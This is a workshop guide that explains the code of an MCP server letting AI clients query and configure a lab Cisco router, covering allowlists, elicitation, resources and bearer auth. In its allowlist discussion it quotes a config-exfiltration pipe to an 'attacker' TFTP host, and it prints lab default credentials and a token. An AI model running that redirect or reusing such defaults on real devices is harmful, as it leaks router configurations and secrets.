# MCP Server Code Walkthrough

## Cisco Router MCP Server — FastMCP Edition (Student Guide)

This guide walks through the complete server code you run in this workshop: `code/server/app/main.py` (referred to below as `main.py`). Keep the file open next to this document — every section here maps to a clearly marked section banner in the code.

**What this server does in one sentence:** it exposes a live Cisco IOS router (Router1, 172.18.2.6) to AI applications through the Model Context Protocol — tools the model can call, resources a client can read, prompts a user can invoke — over an authenticated HTTP endpoint.

---

## 1. The Big Picture

```
LibreChat / MCP Inspector          (MCP clients)
        |
        |  Streamable HTTP  +  Authorization: Bearer <token>
        v
http://172.18.1.2:8000
        |-- GET  /       health check (no auth)
        `-- /mcp         MCP endpoint (bearer token required)
                |
            FastMCP server  (tools, resources, prompts,
                |            notifications, elicitation)
                |  SSH (Netmiko, in worker threads)
                v
            Router1 (172.18.2.6, cisco_ios)
```

Three layers live in one file:

| Layer | What it is | Where in main.py |
|---|---|---|
| FastAPI app | Hosts the health check and mounts everything | bottom of the file |
| BearerAuthMiddleware | Checks the token on every request to /mcp | near the bottom |
| FastMCP server | The actual MCP implementation | everything else |

The old workshop server used the deprecated HTTP+SSE transport (`/sse` + `/messages/`) and hand-wired JSON-RPC dispatch. This version uses **Streamable HTTP** (the current MCP transport — one endpoint, `/mcp`) and **FastMCP**, the official SDK's high-level API. You will notice the difference immediately: there is no `list_tools()` / `call_tool()` pair to keep in sync. A decorator on a plain Python function does both jobs.

---

## 2. Imports and Configuration

```python
ROUTER_CONFIG = {
    "device_type": "cisco_ios",
    "host": os.environ.get("ROUTER_HOST", "172.18.2.6"),
    "username": os.environ.get("ROUTER_USER", "admin"),
    "password": os.environ.get("ROUTER_PASSWORD", "admin"),
    "secret": os.environ.get("ROUTER_SECRET", "admin"),
}

MCP_AUTH_TOKEN = os.environ.get("MCP_AUTH_TOKEN", "cisco-mcp-workshop")
```

Every value reads from an environment variable and falls back to the lab default. The defaults are intentional for this lab — the router credentials are printed in your lab sheet — but the pattern is the important part: **the code contains no value you could not safely publish.** Copy `.env.example` to `.env` and `run.sh` loads it automatically.

`ALLOWED_SHOW_COMMANDS` is a Python set of exact command strings. It powers the `dynamic_show` tool and we will come back to why it is an exact-match set — not a prefix check — in section 5.

---

## 3. Creating the Server

```python
mcp = FastMCP(
    "cisco-router-mcp",
    instructions=(
        "Operates Router1, a live Cisco IOS lab router. Tools marked "
        "read-only are always safe. configure_interface and create_loopback "
        "modify live device configuration — always confirm with the user "
        "before calling them, and state exactly what will change."
    ),
    streamable_http_path="/mcp",
)
```

Two things matter here:

- `instructions` is not a comment. It is sent to every client inside the `initialize` response. LibreChat is configured with `serverInstructions: true`, so this text lands in the system prompt of your chat conversations. This is the server author speaking directly to the model.
- `streamable_http_path="/mcp"` sets the single URL the entire protocol runs over.

---

## 4. Talking to the Router

```python
def _run_show(command: str) -> str:
    connection = ConnectHandler(**ROUTER_CONFIG)
    try:
        return connection.send_command(command)
    finally:
        connection.disconnect()

async def run_show(command: str) -> str:
    return await anyio.to_thread.run_sync(_run_show, command)
```

Netmiko opens an SSH session to the router. That is **blocking** I/O — it freezes the thread until the router answers. The MCP server is async: one process serves every student session at once. If a tool ran Netmiko directly, one slow SSH call would stall everybody.

The fix is the two-function pattern you see for both `run_show` and `run_config`: the blocking `_run_*` function does the SSH work, and the async wrapper pushes it onto a worker thread with `anyio.to_thread.run_sync`. Every tool and resource in the file goes through these two helpers — never through `ConnectHandler` directly.

**The error rule.** Look at any tool body:

```python
try:
    output = await run_show("show ip interface brief")
except Exception as exc:
    return f"Error talking to Router1: {exc}"
```

Errors are **returned as text, never raised**. A raised exception becomes a protocol-level failure the model cannot read. Returned error text becomes a normal tool result — the model reads it, understands what went wrong, and often retries with corrected input. You will watch this happen live in the labs.

---

## 5. Read-Only Tools

The anatomy of a FastMCP tool, using the simplest one:

```python
@mcp.tool(annotations=types.ToolAnnotations(readOnlyHint=True))
async def get_interfaces(ctx: Context) -> str:
    """Get all router interfaces and their status (show ip interface brief)."""
    await ctx.report_progress(0, 1, "Connecting to Router1 over SSH...")
    ...
```

Every part of the function definition becomes protocol data:

| Python | Becomes (in tools/list) |
|---|---|
| function name | tool name: get_interfaces |
| docstring | tool description — the text the LLM reads to decide when to call it |
| type-hinted parameters | inputSchema (JSON Schema, generated for you) |
| return annotation | outputSchema, when it is a structured type |
| annotations= | readOnlyHint / destructiveHint flags |

**The docstring is prompt engineering.** It is the only thing the model knows about your tool. Vague docstring, wrong tool calls.

**Annotations** declare intent: `readOnlyHint=True` marks a tool as safe to call freely; `destructiveHint=True` (section 6) warns clients the tool changes real state. On network equipment this distinction is the whole ballgame.

**Progress** — `ctx.report_progress(...)` sends progress notifications while SSH is working. Inspector shows them; LibreChat uses them to extend its tool timeout (slow router, no timeout kill).

**Structured output** — `get_router_info` returns a Pydantic model instead of a string:

```python
class RouterInfo(BaseModel):
    hostname: str
    version: str
    uptime: str
```

The client receives machine-readable JSON validated against a schema, not text it has to parse. Check the tool in Inspector — you will see an `outputSchema` the other tools do not have.

**dynamic_show and the allowlist.** The model chooses the IOS command; the server decides if it runs:

```python
normalized = " ".join(command.lower().split())
if normalized not in ALLOWED_SHOW_COMMANDS:
    return f"Command rejected: ..."
```

Why exact match and not `command.startswith("show")`? Because prefix matching allows `show running-config` (leaks credentials and SNMP strings) and IOS pipe tricks like `show run | redirect tftp://attacker/...` — a "read-only" prefix check that can write your config to a remote server. Exact matching against a curated set closes both holes. The rejection message lists the allowed commands on purpose: the model reads the error and retries with a valid one.

**snapshot_config** captures `show running-config` to a timestamped file under `snapshots/`. It is the rollback anchor — take a snapshot, change things, and you always have the before state.

---

## 6. Config-Writing Tools

`configure_interface` and `create_loopback` modify a live router. They are handled differently in three ways:

**1. They carry the destructive annotation:**

```python
_CONFIG_TOOL_ANNOTATIONS = types.ToolAnnotations(readOnlyHint=False, destructiveHint=True)
```

**2. They are registered dynamically, not decorated.** They are plain functions listed in `_CONFIG_TOOLS`, registered by `_register_config_tools()`. The `enable_config_tools` tool adds or removes them at runtime and then:

```python
await ctx.session.send_tool_list_changed()
```

That line fires a `notifications/tools/list_changed` — subscribed clients refresh their tool list live. You will watch the tool list shrink and grow in Inspector. The operational pattern being modeled: **destructive capability is an explicit toggle, not an always-on default.** (In this lab they start enabled so the LibreChat exercise works — LibreChat only discovers tools at startup and ignores the notification. Set `MCP_CONFIG_TOOLS_DEFAULT=disabled` to start locked down.)

**3. They ask permission first** — the elicitation gate, next section. They also auto-snapshot the config before changing it, and notify resource subscribers after (section 9).

---

## 7. The Elicitation Gate

Elicitation lets a **server** pause mid-tool-call and ask the **user** a structured question through the client. Here it guards every config write:

```python
result = await ctx.elicit(
    message=f"{description} This modifies a live lab router. Proceed?",
    schema=ConfirmChange,
)
```

In Inspector, calling `configure_interface` pops a real confirmation dialog. Decline, and the tool returns "Change cancelled by user." — the router is never touched.

But look at the first thing `_confirm_change` does:

```python
supports_elicitation = ctx.session.check_client_capability(
    types.ClientCapabilities(elicitation=types.ElicitationCapability())
)
```

Clients declare what they support during `initialize` — this is **capability negotiation**. LibreChat declares no elicitation support, so eliciting against it would fail. The gate degrades: the change proceeds, and the result is prefixed with a warning that no interactive confirmation happened. Same server, same tool — Inspector gets a confirmation dialog, LibreChat gets a warning. That difference is the most important lesson in this file.

One spec rule to memorize: **elicitation must never be used to collect secrets or credentials.** Confirmation questions, choices, parameters — yes. Passwords and API keys — never.

---

## 8. Resources

```python
@mcp.resource("router://running-config", description="Live running configuration of Router1")
async def running_config_resource() -> str:
    return await run_show("show running-config")
```

Four resources: `router://interfaces`, `router://running-config`, `router://baseline` (latest snapshot), and one **template** — `router://interfaces/{name}` — where the client fills in the interface name.

Tools versus resources is a question of **who decides**:

| | Tools | Resources |
|---|---|---|
| Controlled by | the model | the application / user |
| Semantics | do something | read something |
| Example | configure_interface | router://running-config |

Notice `show running-config` appears here as a resource even though `dynamic_show` refuses it as a command. Not a contradiction: the *model* never gets to pull the full config on its own initiative, but a *human* driving the client can deliberately load it as context. Same data, different control point — and the whole endpoint sits behind the bearer token.

**Client reality check:** LibreChat does not list or read MCP resources at all. Resources are an Inspector lab. What "supports MCP" means varies enormously by client — always check.

---

## 9. Prompts

```python
@mcp.prompt(title="Troubleshoot an interface")
def troubleshoot_interface(interface: str) -> str:
    return (f"Troubleshoot {interface} on Router1 step by step: ...")
```

Prompts are reusable, parameterized templates the **user** picks from the client's UI — the third control point (model → tools, application → resources, user → prompts). `troubleshoot_interface` builds a structured diagnostic request; `audit_router_config` runs a config review checklist.

Naming trap: LibreChat's "Prompts" feature in its UI is its own local prompt library — completely unrelated to MCP prompts, which LibreChat does not consume. Prompts are demonstrated in Inspector's Prompts tab.

---

## 10. Subscriptions and Notifications

FastMCP has no subscription API, so this section reaches one level down to the wrapped low-level server (`mcp._mcp_server`):

```python
@_low_level.subscribe_resource()
async def _on_subscribe(uri: AnyUrl) -> None:
    session = _low_level.request_context.session
    ...
```

The server remembers who subscribed to what. After any config write, `_notify_config_changed()` walks the subscriber list and sends `notifications/resources/updated` for `router://running-config`. Lab flow: subscribe in Inspector → run `create_loopback` → watch the update notification arrive without asking for it. That is the push half of MCP — everything else you have seen is request/response.

Just below sits a small but honest hack: the SDK's default `initialize` response hardcodes `resources.subscribe: false` and omits the listChanged flags, even when the server implements them. The `_create_init_options` wrapper overrides that so the server **advertises what it actually does**. Find `"subscribe": true` in Inspector's initialize view — that is this wrapper working.

---

## 11. Authentication

```python
class BearerAuthMiddleware:
    async def __call__(self, scope, receive, send):
        if scope["type"] == "http" and scope["path"].startswith(self.protected_path):
            provided = headers.get("authorization", "")
            if not secrets.compare_digest(provided, self.expected):
                # 401 + WWW-Authenticate: Bearer
```

MCP does not invent its own authentication — remote servers use plain HTTP auth. Here: a bearer token. Every request to `/mcp` must carry `Authorization: Bearer <MCP_AUTH_TOKEN>`; anything else gets `401` with a hint telling you exactly which header to send. `GET /` stays open so you can health-check a server before you have credentials.

Details worth stealing for real code: the comparison uses `secrets.compare_digest` (constant-time — immune to timing attacks), and the middleware is written as raw ASGI rather than the more convenient `BaseHTTPMiddleware`, because the latter buffers streaming responses and MCP's transport streams.

Both clients send the same header: LibreChat from the `headers:` block in `librechat.yaml` (via its `CISCO_MCP_TOKEN` env var — must match the server's `MCP_AUTH_TOKEN`), Inspector from the Bearer Token field in its connect pane.

---

## 12. Startup and Wiring

```python
app = FastAPI(title="Cisco Router MCP Server", lifespan=lifespan)

@app.get("/")
def root(): ...

app.mount("/", mcp.streamable_http_app())
app.add_middleware(BearerAuthMiddleware, token=MCP_AUTH_TOKEN)
```

Order matters and each line is doing a job:

- `lifespan` starts FastMCP's session manager with the app — without it, `/mcp` answers nothing.
- The exact `GET /` route is defined **before** the mount, so it wins; every other path falls through to the FastMCP app, which serves `/mcp`.
- The middleware wraps the whole stack last, so the token check runs before anything else sees the request.

`./run.sh` bootstraps everything: creates `.venv/` on first run, installs `requirements.txt`, loads `.env`, starts uvicorn on `0.0.0.0:8000` (override with `HOST`/`PORT`). `./smoke_test.sh` then verifies the wire basics — health, 401, initialize, tools/list — in thirteen checks.

---

## 13. Things to Try

Each of these is a small, safe modification. Restart the server (`Ctrl+C`, `./run.sh`) after each change and verify in Inspector before trying it from LibreChat.

1. **Add a show command to the allowlist** — one line in `ALLOWED_SHOW_COMMANDS` (try `show ip arp` or `show users`). Verify `dynamic_show` accepts it. Done when: the new command runs and an off-list command is still rejected.
2. **Write a new read-only tool** — `get_uptime`, calling `run_show("show version")` and returning just the uptime line. Copy the shape of `get_interfaces`: decorator, annotation, docstring, try/except returning error text. Done when: it appears in `tools/list` with `readOnlyHint` and answers in LibreChat chat.
3. **Start locked down** — set `MCP_CONFIG_TOOLS_DEFAULT=disabled` in `.env`, restart, and watch `tools/list` shrink to five. Re-enable live with `enable_config_tools` and catch the `tools/list_changed` notification in Inspector.
4. **Change the token** — set a new `MCP_AUTH_TOKEN` in the server's `.env` and watch LibreChat break with 401s until you update `CISCO_MCP_TOKEN` on the LibreChat side. Now you have debugged the most common real-world MCP integration failure.
5. **Add a resource** — expose `show ip route` as `router://routes`. Three lines, copy `interfaces_resource`. Done when: it appears in Inspector's Resources tab.

---

## 14. Quick Reference

| Item | Value |
|---|---|
| Health check | GET http://172.18.1.2:8000/ (no auth) |
| MCP endpoint | http://172.18.1.2:8000/mcp (Streamable HTTP) |
| Auth header | Authorization: Bearer cisco-mcp-workshop |
| Read-only tools | get_interfaces, get_router_info, dynamic_show, snapshot_config |
| Destructive tools | configure_interface, create_loopback (toggle: enable_config_tools) |
| Resources | router://interfaces, router://running-config, router://baseline, router://interfaces/{name} |
| Prompts | troubleshoot_interface, audit_router_config |
| Server env | .env (copy from .env.example) |
| Smoke test | ./smoke_test.sh |
| Reset between cohorts | python3 reset_lab.py --apply |
